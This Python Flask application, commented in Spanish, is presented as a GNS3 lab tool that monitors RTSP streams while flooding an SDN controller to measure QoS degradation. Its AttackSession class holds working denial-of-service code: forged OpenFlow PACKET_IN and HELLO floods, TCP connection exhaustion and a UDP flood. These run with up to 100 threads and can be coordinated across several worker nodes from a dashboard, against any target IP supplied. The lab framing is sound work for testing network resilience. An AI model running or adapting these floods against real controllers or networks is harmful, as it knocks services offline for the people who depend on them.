"""
TrafficGen SDN/RTSP — Laboratorio GNS3
Monitorea clientes RTSP y genera trafico de saturacion hacia el controlador SDN
para observar la degradacion de QoS en la red administrada por OpenFlow.

Modos de operacion (variable de entorno MODE):
  - standalone : UI completa + motor local (un solo nodo)
  - worker     : Sin UI, solo expone API tipada para control remoto
  - dashboard  : UI distribuida, descubre workers y agrega metricas
"""
import os, time, threading, socket, uuid, random, struct, collections, ipaddress, json
import urllib.request, urllib.error
from flask import Flask, render_template, request, jsonify, abort

app = Flask(__name__)

# ── Configuracion de modo ────────────────────────────────────────────────
MODE        = os.environ.get("MODE", "standalone").lower()    # standalone|worker|dashboard
WORKERS_ENV = os.environ.get("WORKERS", "")                   # "http://ip1:80,http://ip2:80"
NODE_NAME   = os.environ.get("NODE_NAME", socket.gethostname())
START_TS    = time.time()

if MODE not in ("standalone", "worker", "dashboard"):
    print(f"[!] MODE invalido: {MODE} -- usando standalone")
    MODE = "standalone"

WORKERS = [w.strip().rstrip("/") for w in WORKERS_ENV.split(",") if w.strip()]

# ── Deteccion de IPs locales (para redirigir workers locales a loopback) ──
def _get_local_ips():
    ips = {"127.0.0.1", "localhost"}
    # Metodo 1: override explicito por env var (mas confiable en GNS3/multi-NIC)
    #   ej: LOCAL_IPS="192.168.10.98,192.168.10.35"
    extra = os.environ.get("LOCAL_IPS", "")
    for ip in extra.split(","):
        ip = ip.strip()
        if ip:
            ips.add(ip)
    # Metodo 2: hostname -I (Docker --network host suele exponer las del host)
    try:
        import subprocess
        out = subprocess.check_output(["hostname", "-I"], text=True, timeout=2)
        for ip in out.strip().split():
            ips.add(ip.strip())
    except Exception:
        pass
    # Metodo 3: IP usada para conectar a internet (suele ser la NIC principal)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    # Metodo 4: enumerar TODAS las interfaces del sistema (mas exhaustivo)
    try:
        import subprocess
        out = subprocess.check_output(["ip", "-4", "-o", "addr"], text=True, timeout=2)
        for line in out.splitlines():
            # ej: "2: eth0    inet 192.168.10.98/24 brd ..."
            parts = line.split()
            for i, p in enumerate(parts):
                if p == "inet" and i + 1 < len(parts):
                    ip = parts[i + 1].split("/")[0]
                    ips.add(ip)
    except Exception:
        pass
    return ips

_LOCAL_IPS = _get_local_ips()
print(f"[*] IPs locales detectadas: {_LOCAL_IPS}")

def _best_url(url):
    """Sustituye la IP del worker por 127.0.0.1 si esta en esta maquina.
    Esto evita pasar por la NIC saturada cuando el worker y el dashboard
    comparten host."""
    import re
    m = re.match(r"(https?://)([^:/]+)(:\d+)?(.*)", url)
    if m and m.group(2) in _LOCAL_IPS:
        port  = m.group(3) or ":80"
        extra = m.group(4) or ""
        return f"http://127.0.0.1{port}{extra}"
    return url


# ── Validacion estricta de parametros (sin shell exec, todo tipado) ───────
ATTACK_MODES_ALLOWED = {"openflow_flood", "tcp_exhaust", "udp_flood"}

def _validate_ip(value):
    """Valida que sea una IPv4 valida. Lanza ValueError si no."""
    if not isinstance(value, str):
        raise ValueError("IP debe ser string")
    try:
        ipaddress.IPv4Address(value)
    except Exception:
        raise ValueError(f"IP invalida: {value}")
    return value

def _validate_port(value, default=None):
    try:
        p = int(value) if value is not None else default
    except (TypeError, ValueError):
        raise ValueError(f"Puerto invalido: {value}")
    if p is None or p < 1 or p > 65535:
        raise ValueError(f"Puerto fuera de rango (1-65535): {p}")
    return p

def _validate_int(value, name, lo, hi, default=None):
    try:
        n = int(value) if value is not None else default
    except (TypeError, ValueError):
        raise ValueError(f"{name} invalido: {value}")
    if n is None or n < lo or n > hi:
        raise ValueError(f"{name} fuera de rango ({lo}-{hi}): {n}")
    return n

def _validate_str(value, name, max_len=128, allow_empty=False):
    if value is None:
        if allow_empty: return ""
        raise ValueError(f"{name} requerido")
    if not isinstance(value, str):
        raise ValueError(f"{name} debe ser string")
    s = value.strip()
    if not s and not allow_empty:
        raise ValueError(f"{name} vacio")
    if len(s) > max_len:
        raise ValueError(f"{name} demasiado largo (max {max_len})")
    # Eliminar caracteres de control
    if any(ord(c) < 32 for c in s):
        raise ValueError(f"{name} contiene caracteres invalidos")
    return s

def _validate_attack_mode(value):
    if value not in ATTACK_MODES_ALLOWED:
        raise ValueError(f"Modo de ataque no permitido. Validos: {sorted(ATTACK_MODES_ALLOWED)}")
    return value

# ── Almacenes globales ─────────────────────────────────────────────────────
_clients_lock  = threading.Lock()
_attack_lock   = threading.Lock()
rtsp_clients   = {}
attack_sessions = {}

# ── Cache de workers (dashboard mode) ─────────────────────────────────────
# El hilo _worker_poll_loop actualiza este dict cada 3s en background.
# La API /api/dashboard/workers solo lee de aqui → respuesta instantanea,
# sin bloqueos aunque un worker tarde en responder.
_wcache       = {}          # url → {online, info, status, last_seen}
_wcache_lock  = threading.Lock()
_OFFLINE_SECS = 12          # marcar offline si sin respuesta > 12 s

def _fetch_one_worker(url):
    """Sondea un worker. Devuelve dict con datos o None si no responde."""
    reach = _best_url(url)
    health, _ = _http_get(f"{reach}/health", timeout=3)
    if health is None:
        return None

    info_box, st_box = [None], [None]
    def gi(): info_box[0] = _http_get(f"{reach}/api/worker/info",   timeout=4)[0]
    def gs(): st_box[0]   = _http_get(f"{reach}/api/worker/status", timeout=4)[0]
    ti = threading.Thread(target=gi, daemon=True)
    ts = threading.Thread(target=gs, daemon=True)
    ti.start(); ts.start()
    ti.join(5); ts.join(5)

    fallback_info = {
        "node": health.get("node", "?"), "mode": health.get("mode", "worker"),
        "uptime_s": health.get("uptime_s", 0), "version": "1.0",
        "allowed_attack_modes": [],
    }
    return {
        "url":    url,
        "online": True,
        "info":   info_box[0] or fallback_info,
        "status": st_box[0],
    }

def _worker_poll_loop():
    """Hilo daemon: actualiza _wcache cada 3 s para todos los workers."""
    while True:
        threads, results = [], {}

        def poll(u):
            data = _fetch_one_worker(u)
            now  = time.time()
            with _wcache_lock:
                if data is not None:
                    data["last_seen"] = now
                    _wcache[u] = data
                else:
                    prev      = _wcache.get(u, {})
                    last_seen = prev.get("last_seen", 0)
                    if (now - last_seen) > _OFFLINE_SECS:
                        _wcache[u] = {"url": u, "online": False,
                                      "last_seen": 0, "error": "sin respuesta"}
                    # si no paso el umbral: conservar el ultimo dato bueno

        for wu in WORKERS:
            t = threading.Thread(target=poll, args=(wu,), daemon=True)
            t.start(); threads.append(t)
        for t in threads:
            t.join(timeout=10)
        time.sleep(3)

# NOTA: el hilo _worker_poll_loop se arranca al final del archivo,
# despues de que _http_get/_http_post esten definidos (sino: NameError).
metrics_history = collections.deque(maxlen=120)   # 2 minutos de historia (1 snap/s)


# ══════════════════════════════════════════════════════════════════════════
# RTSP CLIENT  — monitorea una sesion de streaming
# ══════════════════════════════════════════════════════════════════════════
class RTSPClient:
    ST_CONNECTING = "connecting"
    ST_STREAMING  = "streaming"
    ST_ERROR      = "error"
    ST_STOPPED    = "stopped"

    def __init__(self, cid, server_ip, server_port, stream_path, label=""):
        self.cid         = cid
        self.server_ip   = server_ip
        self.server_port = int(server_port)
        self.stream_path = stream_path.lstrip("/")
        self.label       = label or f"Cliente-{cid[:5]}"
        self._active     = False
        self._lock       = threading.Lock()

        # Estado publico
        self.status      = self.ST_STOPPED
        self.latency_ms  = 0.0
        self.reconnects  = 0
        self.errors      = 0
        self.last_error  = ""
        self.uptime_s    = 0.0
        self.rtt_history = collections.deque(maxlen=60)
        self._connected_at = None

    # ── Control ──────────────────────────────────────────────────────────
    def start(self):
        self._active = True
        threading.Thread(target=self._run, daemon=True).start()

    def stop(self):
        self._active = False
        with self._lock:
            self.status = self.ST_STOPPED

    # ── Loop principal ────────────────────────────────────────────────────
    def _run(self):
        while self._active:
            self._session()
            if self._active:
                with self._lock:
                    self.reconnects += 1
                time.sleep(random.uniform(1.5, 4.0))

    def _session(self):
        self._set("status", self.ST_CONNECTING)
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(6)
            t0 = time.perf_counter()
            sock.connect((self.server_ip, self.server_port))
            self._push_rtt((time.perf_counter() - t0) * 1000)

            url  = f"rtsp://{self.server_ip}:{self.server_port}/{self.stream_path}"
            cseq = 1

            # DESCRIBE
            self._send_rtsp(sock, f"DESCRIBE {url} RTSP/1.0\r\nCSeq: {cseq}\r\n"
                            "User-Agent: TrafficGenGNS3/1.0\r\nAccept: application/sdp\r\n\r\n")
            resp = sock.recv(4096).decode(errors="ignore")
            if "200 OK" not in resp:
                raise ConnectionError(f"DESCRIBE: {resp[:80]}")

            self._set("status", self.ST_STREAMING)
            with self._lock:
                self._connected_at = time.time()
            sock.settimeout(10)

            # Keep-alive via OPTIONS cada 4 s
            last_ka = time.time()
            while self._active:
                with self._lock:
                    if self._connected_at:
                        self.uptime_s = round(time.time() - self._connected_at, 1)
                if time.time() - last_ka >= 4:
                    cseq += 1
                    t0 = time.perf_counter()
                    self._send_rtsp(sock, f"OPTIONS {url} RTSP/1.0\r\nCSeq: {cseq}\r\n"
                                    "User-Agent: TrafficGenGNS3/1.0\r\n\r\n")
                    data = sock.recv(512).decode(errors="ignore")
                    if not data:
                        raise ConnectionError("Servidor cerro la conexion")
                    self._push_rtt((time.perf_counter() - t0) * 1000)
                    last_ka = time.time()
                time.sleep(0.5)
        except Exception as exc:
            with self._lock:
                self.status     = self.ST_ERROR
                self.last_error = str(exc)[:120]
                self.errors    += 1
        finally:
            if sock:
                try: sock.close()
                except: pass

    def _send_rtsp(self, sock, msg):
        sock.sendall(msg.encode())

    def _set(self, attr, val):
        with self._lock:
            setattr(self, attr, val)

    def _push_rtt(self, rtt):
        rtt = round(rtt, 1)
        with self._lock:
            self.latency_ms = rtt
            self.rtt_history.append(rtt)

    def get_info(self):
        with self._lock:
            rtt_list = list(self.rtt_history)
            avg_rtt  = round(sum(rtt_list) / len(rtt_list), 1) if rtt_list else 0
            return {
                "cid":        self.cid,
                "label":      self.label,
                "server":     f"rtsp://{self.server_ip}:{self.server_port}/{self.stream_path}",
                "status":     self.status,
                "latency_ms": self.latency_ms,
                "avg_rtt":    avg_rtt,
                "rtt_history": rtt_list[-20:],
                "reconnects": self.reconnects,
                "errors":     self.errors,
                "last_error": self.last_error,
                "uptime_s":   self.uptime_s,
            }


# ══════════════════════════════════════════════════════════════════════════
# ATTACK SESSION — satura el controlador SDN (puerto OpenFlow 6633)
# ══════════════════════════════════════════════════════════════════════════

# ── Constructores de mensajes OpenFlow 1.3 ────────────────────────────────
# version=0x04 (OpenFlow 1.3) en todos los mensajes
OF_VERSION = 0x04

def _of_hello():
    """OpenFlow 1.3 HELLO — fuerza handshakes continuos."""
    return struct.pack("!BBHI", OF_VERSION, 0x00, 8, random.randint(1, 0xFFFFFFFF))

def _oxm_match_all():
    """OXM match vacio — coincide con cualquier paquete (OF 1.3)."""
    # type=OFPMT_OXM(1), length=4 (solo cabecera, sin campos)
    # Alineado a 8 bytes: 4 bytes header + 4 bytes padding
    return struct.pack("!HH", 1, 4) + b'\x00\x00\x00\x00'

def _oxm_match_in_port(port):
    """OXM match con campo in_port (OF 1.3)."""
    # OXM TLV: class=0x8000(OPENFLOW_BASIC), field=0(IN_PORT), hasmask=0, len=4
    oxm_field = struct.pack("!HBB", 0x8000, 0x00, 4) + struct.pack("!I", port)
    length = 4 + len(oxm_field)          # 4 (match hdr) + 8 (campo) = 12
    match  = struct.pack("!HH", 1, length) + oxm_field
    pad    = (8 - (length % 8)) % 8     # padding a multiplo de 8 → 4 bytes
    return match + b'\x00' * pad         # total 16 bytes

def _of_packet_in():
    """
    OpenFlow 1.3 PACKET_IN falso — mensaje mas costoso para el controlador:
    cada Packet-In obliga al controlador a consultar la tabla de flujos,
    ejecutar la logica SDN y emitir un FLOW_MOD al switch OVS.
    Formato OF 1.3: buffer_id + total_len + reason + table_id + cookie + OXM match.
    """
    in_port = random.randint(1, 48)

    # Frame Ethernet ARP falso con MACs e IPs aleatorias
    eth = bytes([0xFF]*6 +
                [random.randint(0, 255) for _ in range(6)] +
                [0x08, 0x06] +                              # EtherType ARP
                [0x00,0x01, 0x08,0x00, 0x06,0x04, 0x00,0x01] +
                [random.randint(0, 255) for _ in range(6)] +
                [10, random.randint(1,254), random.randint(1,254), random.randint(1,254)] +
                [0x00]*6 +
                [10, 0, 0, 1])

    buf_id   = 0xFFFFFFFF          # OFP_NO_BUFFER
    tot_len  = len(eth)
    reason   = 0x00                # OFPR_NO_MATCH
    table_id = 0
    cookie   = 0xFFFFFFFFFFFFFFFF

    match  = _oxm_match_in_port(in_port)   # 16 bytes

    # Cuerpo OF 1.3 PACKET_IN
    body  = struct.pack("!IHBBQ", buf_id, tot_len, reason, table_id, cookie)
    body += match
    body += b'\x00\x00'           # 2 bytes de padding antes del frame
    body += eth

    header = struct.pack("!BBHI", OF_VERSION, 0x0A, 8 + len(body),
                         random.randint(1, 0xFFFFFFFF))
    return header + body

def _of_features_request():
    """OpenFlow 1.3 FEATURES_REQUEST — fuerza respuestas costosas del controlador."""
    return struct.pack("!BBHI", OF_VERSION, 0x05, 8, random.randint(1, 0xFFFFFFFF))


class AttackSession:
    """
    Genera trafico masivo hacia el controlador SDN (192.168.10.6:6633).
    Modos:
      - openflow_flood : Packet-In + HELLO falsos por TCP (impacto maximo en SDN)
      - tcp_exhaust    : Agota conexiones TCP al controlador
      - udp_flood      : Flood UDP generico
    """

    def __init__(self, target_ip, target_port, mode, threads, duration):
        self.sid         = str(uuid.uuid4())[:8]
        self.target_ip   = target_ip
        self.target_port = int(target_port)
        self.mode        = mode
        self.n_threads   = max(1, min(int(threads), 100))
        self.duration    = int(duration)
        self._active     = False
        self._lock       = threading.Lock()
        self.stats = {
            "status":       "stopped",
            "packets_sent": 0,
            "bytes_sent":   0,
            "connections":  0,
            "errors":       0,
            "start_time":   None,
        }

    def start(self):
        self._active = True
        with self._lock:
            self.stats["status"]     = "running"
            self.stats["start_time"] = time.time()

        workers = {
            "openflow_flood": self._of_flood_worker,
            "tcp_exhaust":    self._tcp_exhaust_worker,
            "udp_flood":      self._udp_worker,
        }
        fn = workers.get(self.mode, self._of_flood_worker)

        for _ in range(self.n_threads):
            threading.Thread(target=fn, daemon=True).start()

        if self.duration > 0:
            t = threading.Timer(self.duration, self.stop)
            t.daemon = True
            t.start()

    def stop(self):
        self._active = False
        with self._lock:
            self.stats["status"] = "stopped"

    # ── Worker: OpenFlow flood (ataque especifico SDN) ────────────────────
    def _of_flood_worker(self):
        end = self._end()
        while self._active and self._not_expired(end):
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.target_port))
                self._inc("connections")

                # Handshake: enviar HELLO para que el controlador responda
                sock.sendall(_of_hello())
                sock.recv(256)  # consumir HELLO del controlador

                # Saturar con Packet-In falsos
                while self._active and self._not_expired(end):
                    msg = _of_packet_in()
                    sock.sendall(msg)
                    self._inc("packets_sent")
                    self._add("bytes_sent", len(msg))
                    time.sleep(0.002)  # ceder CPU al servidor Flask
            except Exception:
                self._inc("errors")
            finally:
                if sock:
                    try: sock.close()
                    except: pass

    # ── Worker: agotamiento de conexiones TCP ─────────────────────────────
    def _tcp_exhaust_worker(self):
        end     = self._end()
        payload = _of_hello()
        sockets = []
        MAX_HELD = 40   # max sockets abiertos por hilo (100 hilos × 40 = 4000 FDs)
        try:
            while self._active and self._not_expired(end):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.settimeout(3)
                    s.connect((self.target_ip, self.target_port))
                    s.sendall(payload)
                    sockets.append(s)
                    self._inc("connections")
                    self._inc("packets_sent")
                    self._add("bytes_sent", len(payload))
                    if len(sockets) >= MAX_HELD:
                        # Rotar: cerrar los mas antiguos
                        for old in sockets[:MAX_HELD // 2]:
                            try: old.close()
                            except: pass
                        sockets = sockets[MAX_HELD // 2:]
                    time.sleep(0.05)
                except Exception:
                    self._inc("errors")
                    time.sleep(0.1)
        finally:
            for s in sockets:
                try: s.close()
                except: pass

    # ── Worker: UDP flood ─────────────────────────────────────────────────
    def _udp_worker(self):
        end     = self._end()
        payload = bytes(random.getrandbits(8) for _ in range(1400))
        sock    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            while self._active and self._not_expired(end):
                try:
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    self._inc("packets_sent")
                    self._add("bytes_sent", len(payload))
                except Exception:
                    self._inc("errors")
        finally:
            sock.close()

    # ── Helpers ───────────────────────────────────────────────────────────
    def _end(self):
        if self.duration > 0 and self.stats["start_time"]:
            return self.stats["start_time"] + self.duration
        return None

    def _not_expired(self, end):
        return end is None or time.time() < end

    def _inc(self, k):
        with self._lock: self.stats[k] += 1

    def _add(self, k, v):
        with self._lock: self.stats[k] += v

    def get_info(self):
        with self._lock:
            s = self.stats.copy()
        elapsed = round(time.time() - s["start_time"], 1) if s["start_time"] else 0
        pps  = round(s["packets_sent"] / elapsed) if elapsed > 0 else 0
        mbps = round(s["bytes_sent"] * 8 / elapsed / 1_000_000, 2) if elapsed > 0 else 0
        return {
            "sid":          self.sid,
            "target":       f"{self.target_ip}:{self.target_port}",
            "mode":         self.mode,
            "threads":      self.n_threads,
            "duration":     self.duration,
            "status":       s["status"],
            "packets_sent": s["packets_sent"],
            "bytes_sent":   s["bytes_sent"],
            "connections":  s["connections"],
            "errors":       s["errors"],
            "elapsed":      elapsed,
            "pps":          pps,
            "mbps":         mbps,
        }


# ══════════════════════════════════════════════════════════════════════════
# METRICS SNAPSHOT  (historial para graficas en tiempo real)
# ══════════════════════════════════════════════════════════════════════════
def _snapshot_worker():
    while True:
        time.sleep(1)
        with _clients_lock:
            clients = list(rtsp_clients.values())
        with _attack_lock:
            attacks = [a for a in attack_sessions.values() if a.stats["status"] == "running"]

        streaming = sum(1 for c in clients if c.status == RTSPClient.ST_STREAMING)
        errors    = sum(1 for c in clients if c.status == RTSPClient.ST_ERROR)
        connecting= sum(1 for c in clients if c.status == RTSPClient.ST_CONNECTING)
        rtts      = [c.latency_ms for c in clients if c.latency_ms > 0]
        avg_rtt   = round(sum(rtts) / len(rtts), 1) if rtts else 0
        max_rtt   = round(max(rtts), 1) if rtts else 0

        attack_pps  = sum(a.stats["packets_sent"] for a in attacks)
        attack_mbps = 0.0
        for a in attacks:
            elapsed = time.time() - a.stats["start_time"] if a.stats["start_time"] else 1
            attack_mbps += a.stats["bytes_sent"] * 8 / max(elapsed, 1) / 1_000_000
        attack_mbps = round(attack_mbps, 2)

        metrics_history.append({
            "ts":          round(time.time() * 1000),  # ms epoch para Chart.js
            "streaming":   streaming,
            "errors":      errors,
            "connecting":  connecting,
            "total":       len(clients),
            "avg_rtt":     avg_rtt,
            "max_rtt":     max_rtt,
            "attack_pps":  attack_pps,
            "attack_mbps": attack_mbps,
            "under_attack": len(attacks) > 0,
        })

threading.Thread(target=_snapshot_worker, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════
# FLASK API
# ══════════════════════════════════════════════════════════════════════════
@app.route("/")
def index():
    if MODE == "dashboard":
        return render_template("dashboard.html", workers=WORKERS, node_name=NODE_NAME)
    if MODE == "worker":
        # Sin UI, devuelve estado JSON minimo
        return jsonify({
            "service":  "trafficgen-worker",
            "node":     NODE_NAME,
            "mode":     "worker",
            "uptime_s": round(time.time() - START_TS, 1),
            "endpoints": [
                "GET  /api/worker/info",
                "GET  /api/worker/status",
                "POST /api/worker/rtsp/start",
                "POST /api/worker/rtsp/stop",
                "POST /api/worker/attack/start",
                "POST /api/worker/attack/stop",
                "POST /api/worker/shutdown",
            ],
        })
    return render_template("index.html")

# ── Clientes RTSP ─────────────────────────────────────────────────────────
@app.route("/api/clients")
def api_clients():
    with _clients_lock:
        return jsonify([c.get_info() for c in rtsp_clients.values()])

@app.route("/api/clients/add", methods=["POST"])
def api_clients_add():
    d = request.json or {}
    for f in ("server_ip", "server_port", "stream_path"):
        if not d.get(f):
            return jsonify({"error": f"Campo requerido: {f}"}), 400
    n = max(1, min(int(d.get("count", 1)), 50))
    added = []
    for i in range(n):
        cid    = str(uuid.uuid4())[:8]
        base   = d.get("label", "Cliente")
        label  = f"{base}-{i+1}" if n > 1 else base
        c = RTSPClient(cid, d["server_ip"], d["server_port"],
                       d["stream_path"], label)
        c.start()
        with _clients_lock:
            rtsp_clients[cid] = c
        added.append(cid)
    return jsonify({"added": added, "count": n})

@app.route("/api/clients/stop/<cid>", methods=["POST"])
def api_client_stop(cid):
    with _clients_lock:
        c = rtsp_clients.get(cid)
    if not c: return jsonify({"error": "No encontrado"}), 404
    c.stop()
    return jsonify({"ok": True})

@app.route("/api/clients/delete/<cid>", methods=["DELETE"])
def api_client_delete(cid):
    with _clients_lock:
        c = rtsp_clients.pop(cid, None)
    if not c: return jsonify({"error": "No encontrado"}), 404
    c.stop()
    return jsonify({"ok": True})

@app.route("/api/clients/clear", methods=["POST"])
def api_clients_clear():
    with _clients_lock:
        all_c = list(rtsp_clients.values())
        rtsp_clients.clear()
    for c in all_c: c.stop()
    return jsonify({"cleared": len(all_c)})

# ── Ataques SDN ───────────────────────────────────────────────────────────
@app.route("/api/attack/list")
def api_attack_list():
    with _attack_lock:
        return jsonify([a.get_info() for a in attack_sessions.values()])

@app.route("/api/attack/start", methods=["POST"])
def api_attack_start():
    d = request.json or {}
    if not d.get("target_ip"):
        return jsonify({"error": "target_ip requerido"}), 400
    a = AttackSession(
        target_ip   = d.get("target_ip", "192.168.10.6"),
        target_port = d.get("target_port", 6633),
        mode        = d.get("mode", "openflow_flood"),
        threads     = d.get("threads", 10),
        duration    = d.get("duration", 0),
    )
    a.start()
    with _attack_lock:
        attack_sessions[a.sid] = a
    return jsonify({"sid": a.sid, "status": "started"})

@app.route("/api/attack/stop/<sid>", methods=["POST"])
def api_attack_stop(sid):
    with _attack_lock:
        a = attack_sessions.get(sid)
    if not a: return jsonify({"error": "No encontrado"}), 404
    a.stop()
    return jsonify({"ok": True})

@app.route("/api/attack/stopall", methods=["POST"])
def api_attack_stopall():
    with _attack_lock:
        all_a = list(attack_sessions.values())
    for a in all_a: a.stop()
    return jsonify({"stopped": len(all_a)})

@app.route("/api/attack/clear", methods=["POST"])
def api_attack_clear():
    with _attack_lock:
        to_del = [s for s, a in attack_sessions.items() if a.stats["status"] == "stopped"]
        for s in to_del: del attack_sessions[s]
    return jsonify({"cleared": len(to_del)})

# ── Metricas historicas ───────────────────────────────────────────────────
@app.route("/api/metrics")
def api_metrics():
    return jsonify(list(metrics_history))


# ══════════════════════════════════════════════════════════════════════════
# WORKER API — endpoints tipados con validacion estricta (sin shell exec)
# Solo se exponen acciones predefinidas: iniciar/detener clientes RTSP y
# generadores de trafico. Sin ejecucion de comandos arbitrarios.
# ══════════════════════════════════════════════════════════════════════════
def _worker_only():
    if MODE == "dashboard":
        abort(403, description="Endpoint no disponible en modo dashboard")

@app.route("/health")
def health():
    """Health check ultraligero — sin locks, sin iteraciones.
    Usado por el dashboard para verificar disponibilidad antes de pedir status."""
    return jsonify({"ok": True, "node": NODE_NAME, "mode": MODE,
                    "uptime_s": round(time.time() - START_TS, 1)})

@app.route("/api/worker/info")
def api_worker_info():
    return jsonify({
        "node":      NODE_NAME,
        "mode":      MODE,
        "uptime_s":  round(time.time() - START_TS, 1),
        "version":   "1.0",
        "allowed_attack_modes": sorted(ATTACK_MODES_ALLOWED),
    })

@app.route("/api/worker/status")
def api_worker_status():
    """Resumen completo del estado del worker."""
    with _clients_lock:
        clients = [c.get_info() for c in rtsp_clients.values()]
    with _attack_lock:
        attacks = [a.get_info() for a in attack_sessions.values()]

    streaming = sum(1 for c in clients if c["status"] == "streaming")
    errors    = sum(1 for c in clients if c["status"] == "error")
    rtts      = [c["latency_ms"] for c in clients if c["latency_ms"] > 0]
    avg_rtt   = round(sum(rtts) / len(rtts), 1) if rtts else 0

    running_attacks = [a for a in attacks if a["status"] == "running"]
    atk_pps  = sum(a["pps"] for a in running_attacks)
    atk_mbps = round(sum(a["mbps"] for a in running_attacks), 2)

    return jsonify({
        "node":      NODE_NAME,
        "uptime_s":  round(time.time() - START_TS, 1),
        "rtsp": {
            "total":     len(clients),
            "streaming": streaming,
            "errors":    errors,
            "avg_rtt_ms": avg_rtt,
            "clients":   clients,
        },
        "attack": {
            "total":      len(attacks),
            "active":     len(running_attacks),
            "total_pps":  atk_pps,
            "total_mbps": atk_mbps,
            "sessions":   attacks,
        },
    })

@app.route("/api/worker/rtsp/start", methods=["POST"])
def api_worker_rtsp_start():
    _worker_only()
    d = request.json or {}
    try:
        server_ip   = _validate_ip(d.get("server_ip"))
        server_port = _validate_port(d.get("server_port"), default=554)
        stream_path = _validate_str(d.get("stream_path"), "stream_path", max_len=200)
        count       = _validate_int(d.get("count", 1), "count", 1, 50)
        label       = _validate_str(d.get("label", "Cliente"), "label",
                                    max_len=64, allow_empty=True)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

    added = []
    for i in range(count):
        cid = str(uuid.uuid4())[:8]
        lbl = f"{label}-{i+1}" if count > 1 else label
        c = RTSPClient(cid, server_ip, server_port, stream_path, lbl)
        c.start()
        with _clients_lock:
            rtsp_clients[cid] = c
        added.append(cid)

    return jsonify({"ok": True, "added": added, "count": count})

@app.route("/api/worker/rtsp/stop", methods=["POST"])
def api_worker_rtsp_stop():
    _worker_only()
    d = request.json or {}
    cid = d.get("cid")
    all_flag = bool(d.get("all"))

    if all_flag:
        with _clients_lock:
            all_c = list(rtsp_clients.values())
            rtsp_clients.clear()
        for c in all_c: c.stop()
        return jsonify({"ok": True, "stopped": len(all_c)})

    if not cid:
        return jsonify({"error": "Especifica 'cid' o 'all': true"}), 400

    cid = _validate_str(cid, "cid", max_len=64)
    with _clients_lock:
        c = rtsp_clients.pop(cid, None)
    if not c:
        return jsonify({"error": "Cliente no encontrado"}), 404
    c.stop()
    return jsonify({"ok": True, "stopped": 1})

@app.route("/api/worker/attack/start", methods=["POST"])
def api_worker_attack_start():
    _worker_only()
    d = request.json or {}
    try:
        target_ip   = _validate_ip(d.get("target_ip"))
        target_port = _validate_port(d.get("target_port"), default=6633)
        mode        = _validate_attack_mode(d.get("mode", "openflow_flood"))
        threads     = _validate_int(d.get("threads", 10), "threads", 1, 100)
        duration    = _validate_int(d.get("duration", 0), "duration", 0, 86400)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

    a = AttackSession(target_ip, target_port, mode, threads, duration)
    a.start()
    with _attack_lock:
        attack_sessions[a.sid] = a
    return jsonify({"ok": True, "sid": a.sid})

@app.route("/api/worker/attack/stop", methods=["POST"])
def api_worker_attack_stop():
    _worker_only()
    d = request.json or {}
    sid = d.get("sid")
    all_flag = bool(d.get("all"))

    if all_flag:
        with _attack_lock:
            all_a = list(attack_sessions.values())
        for a in all_a: a.stop()
        return jsonify({"ok": True, "stopped": len(all_a)})

    if not sid:
        return jsonify({"error": "Especifica 'sid' o 'all': true"}), 400

    sid = _validate_str(sid, "sid", max_len=64)
    with _attack_lock:
        a = attack_sessions.get(sid)
    if not a:
        return jsonify({"error": "Sesion no encontrada"}), 404
    a.stop()
    return jsonify({"ok": True, "stopped": 1})

@app.route("/api/worker/shutdown", methods=["POST"])
def api_worker_shutdown():
    """Detiene toda actividad (clientes RTSP y ataques) sin matar el proceso."""
    _worker_only()
    with _clients_lock:
        all_c = list(rtsp_clients.values())
        rtsp_clients.clear()
    for c in all_c: c.stop()

    with _attack_lock:
        all_a = list(attack_sessions.values())
    for a in all_a: a.stop()

    return jsonify({
        "ok": True,
        "rtsp_stopped":   len(all_c),
        "attack_stopped": len(all_a),
    })


# ══════════════════════════════════════════════════════════════════════════
# DASHBOARD API — descubre y agrega metricas de los workers configurados
# ══════════════════════════════════════════════════════════════════════════
def _http_get(url, timeout=2):
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode("utf-8")), None
    except Exception as e:
        return None, str(e)

def _http_post(url, payload, timeout=3):
    try:
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            url, data=data, method="POST",
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode("utf-8")), None
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read().decode("utf-8"))
        except Exception:
            body = {"error": str(e)}
        return body, f"HTTP {e.code}"
    except Exception as e:
        return None, str(e)

def _resolve_workers(spec):
    """spec: 'all' o lista de URLs. Devuelve lista de URLs."""
    if spec == "all" or spec is None:
        return list(WORKERS)
    if isinstance(spec, list):
        return [w for w in spec if w in WORKERS]
    return []

@app.route("/api/dashboard/workers")
def api_dashboard_workers():
    """Lee la cache de workers actualizada en background. Respuesta instantanea."""
    if MODE != "dashboard":
        return jsonify({"error": "Solo disponible en modo dashboard"}), 403
    with _wcache_lock:
        results = [_wcache.get(url, {"url": url, "online": False}) for url in WORKERS]
    return jsonify(results)

@app.route("/api/dashboard/broadcast/rtsp/start", methods=["POST"])
def api_dash_rtsp_start():
    if MODE != "dashboard":
        return jsonify({"error": "Solo modo dashboard"}), 403
    d = request.json or {}
    targets = _resolve_workers(d.get("workers", "all"))
    payload = {
        "server_ip":   d.get("server_ip"),
        "server_port": d.get("server_port", 554),
        "stream_path": d.get("stream_path", "live/stream"),
        "count":       d.get("count", 1),
        "label":       d.get("label", "Cliente"),
    }
    results = {}
    for url in targets:
        body, err = _http_post(f"{_best_url(url)}/api/worker/rtsp/start", payload)
        results[url] = body if body else {"error": err}
    return jsonify({"results": results})

